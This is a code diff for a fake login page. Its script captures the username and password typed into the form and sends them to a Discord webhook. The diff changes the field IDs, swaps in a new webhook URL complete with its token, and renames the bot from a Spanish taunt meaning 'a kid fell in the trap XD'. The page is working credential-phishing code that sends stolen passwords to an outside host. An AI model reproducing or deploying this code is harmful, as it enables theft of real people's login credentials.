@@ -13,30 +13,29 @@
 </form>
 
 <script>
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
     e.preventDefault();
 
     // Get the username and password values
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+    const username = document.getElementById("login-username").value;
+    const password = document.getElementById("login-password").value;
 
-    // Create the message for Discord
     const message = `**New login attempt:**
     - Username: ${username}
     - Password: ${password}`;
 
     // Call the Discord webhook with the data
-    await fetch('https://discord.com/api/webhooks/1314310737442766998/-26q1wViJZycQmY98vIRGapOAf75SOiQz_xbHvO2898OzRDasPbBAIQjAoaaPucxdjDn', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+    await fetch("https://discord.com/api/webhooks/1319101228281626686/F622yGV7ELvWopva4S9wJdMMDJLnNqwVezCiZ-l8OySKa2mDAbARMfOBSnG5tRVMiT1p", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             content: message, // This is the message with the data
-            username: "un niño callo en la trampa XD", // Webhook name
+            username: "turip", // Webhook name
         }),
     });
 
     // Optional: Reset the form
-    document.getElementById('loginForm').reset();
+    document.getElementById("loginForm").reset();
 });
 </script>	
 
